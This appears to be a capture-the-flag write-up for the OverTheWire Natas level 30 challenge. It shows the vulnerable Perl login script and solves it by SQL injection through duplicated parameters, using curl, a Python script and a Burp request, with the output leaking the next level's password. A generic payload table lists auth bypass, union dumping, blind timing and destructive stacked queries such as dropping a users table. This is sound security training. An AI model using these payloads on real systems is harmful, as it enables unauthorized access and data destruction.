# Natas Level 29 → Level 30 PERL SQL Injection

## Previous Flag
<b>WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH</b>

## Goal
Username: natas30<br>
URL: http://natas30.natas.labs.overthewire.org<br>

Username: <br>
Password: <br>
login

| Payload                                                | Type                    | Description                                                      |
|--------------------------------------------------------|-------------------------|------------------------------------------------------------------|
| `' OR '1'='1' -- `                                     | Auth Bypass             | Always true string condition; bypass login                      |
| `' OR 1=1 -- `                                         | Auth Bypass             | Numeric always true condition                                   |
| `' OR '1'='1' #`                                       | Auth Bypass             | MySQL version with hash comment                                 |
| `' OR '1'='1' /*`                                      | Auth Bypass             | Bypass using multi-line comment style                           |
| `' OR 1=1 LIMIT 1 -- `                                 | Auth Bypass             | Limits query result to one row                                  |
| `' UNION SELECT null, null -- `                        | Union-Based             | Basic union injection for 2-column queries                      |
| `' UNION SELECT username, password FROM users -- `     | Union-Based             | Dump user data from `users` table                               |
| `' UNION SELECT 1, @@version -- `                      | Union-Based             | Leak DB version                                                  |
| `' AND 1=CONVERT(int, (SELECT @@version)) -- `         | Error-Based             | Trigger SQL error to reveal DB version (MSSQL)                  |
| `' AND 1=CAST((SELECT user()) AS INT) -- `             | Error-Based             | Trigger error to leak DB user info (MySQL/PostgreSQL)           |
| `' OR IF(1=1, SLEEP(5), 0) -- `                        | Time-Based Blind (MySQL)| Delays if condition is true                                     |
| `' OR pg_sleep(5) -- `                                 | Time-Based Blind (Postgres)| Delay-based blind injection                                  |
| `' OR 1=1; WAITFOR DELAY '00:00:05' -- `               | Time-Based Blind (MSSQL)| Time delay to test true condition                               |
| `'; DROP TABLE users; -- `                             | Stacked Queries         | Drops a table (if multiple queries are allowed)                 |
| `'; INSERT INTO logins VALUES ('admin','pass'); -- `   | Stacked Queries         | Adds an admin user                                               |
| `' ORDER BY 1 -- `                                     | Column Discovery        | Used to test number of columns in result set                    |
| `' ORDER BY 2 -- `                                     | Column Discovery        | Increment to find total columns                                 |
| `' ORDER BY 3 -- `                                     | Column Discovery        | If error: query has fewer than 3 columns                        |

## What I learned
```
Google: perl mysql injection vulnerable
https://security.stackexchange.com/questions/175703/is-this-perl-database-connection-vulnerable-to-sql-injection
```

## Solution
```
View source code
http://natas30.natas.labs.overthewire.org/index-source.html

/var/www/natas/natas30/index-source.pl
#!/usr/bin/perl
use CGI qw(:standard);
use DBI;

print <<END;
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas30", "pass": "<censored>" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->

<h1>natas30</h1>
<div id="content">

<form action="index.pl" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
END

if ('POST' eq request_method && param('username') && param('password')){
    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1}); 👀
    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 

    my $sth = $dbh->prepare($query);
    $sth->execute();
    my $ver = $sth->fetch();
    if ($ver){
        print "win!<br>";
        print "here is your result:<br>";
        print @$ver; 👀
    }
    else{
        print "fail :(";
    }
    $sth->finish();
    $dbh->disconnect();
}

print <<END;
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
END

Method 1: python since can't modify parameters in most browsers
@trungdullc ➜ /workspaces/01noobHacker (main) $ python3 scripts/natas30.py ⌨️
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas30", "pass": "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->

<h1>natas30</h1>
<div id="content">

<form action="index.pl" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
win!<br>here is your result:<br>natas31m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 🔐
</div>
</body>
</html>

Method 2: curl
@trungdullc ➜ /workspaces/01noobHacker (main) $ curl -u natas30:WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH \
     -d "username=natas28&password='lol' or 1&password=4" \
     http://natas30.natas.labs.overthewire.org/index.pl ⌨️
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas30", "pass": "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->

<h1>natas30</h1>
<div id="content">

<form action="index.pl" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
win!<br>here is your result:<br>natas31m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 🔐
</div>
</body>
</html>

Method 3: Burp Suite:
POST /index.pl HTTP/1.1
Host: natas30.natas.labs.overthewire.org
Content-Length: 47
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMDpXUWh4MUJ2Y21QOWlyczJNUDl0Um5Mc05hREk3NllySA==
Accept-Language: en-US,en;q=0.9
Origin: http://natas30.natas.labs.overthewire.org
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas30.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=natas28&password='lol'+or+1&password=4 👀

Look at Response:
HTTP/1.1 200 OK
Date: Thu, 07 Aug 2025 22:27:47 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1327
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas30", "pass": "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->

<h1>natas30</h1>
<div id="content">

<form action="index.pl" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
win!<br>here is your result:<br>natas31m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 🔐
</div>
</body>
</html>
```

## Flag
<b>m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y</b>

## Continue
[Continue](/overthewire/Natas3031.md)